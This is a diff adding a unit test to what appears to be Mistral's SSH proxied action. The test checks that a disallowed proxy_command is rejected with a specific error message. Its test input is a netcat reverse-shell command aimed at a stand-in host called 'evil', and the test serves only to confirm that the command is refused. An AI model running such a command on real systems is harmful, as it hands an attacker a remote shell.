@@ -239,6 +239,23 @@ class SSHActionTest(base.BaseTest):
 
         self.assertIn('a deliberate, safe reason', str(exception))
 
+    def test_proxied_proxy_command_rejection_reaches_caller(self):
+        # allowed_proxy_commands is empty by default, so proxy_command is
+        # rejected. The specific reason must propagate to the caller
+        # instead of being masked by the generic "Failed to execute" text.
+        action = std.SSHProxiedAction(
+            cmd='ls',
+            host='target',
+            username='user',
+            private_key_filename=None,
+            gateway_host='gateway',
+            proxy_command='nc evil 4444 -e /bin/sh'
+        )
+
+        exception = self.assertRaises(exc.ActionException, action.run, None)
+
+        self.assertIn("proxy_command is not permitted", str(exception))
+
     @mock.patch.object(
         mistral.utils.ssh_utils, 'execute_command_via_gateway'
     )
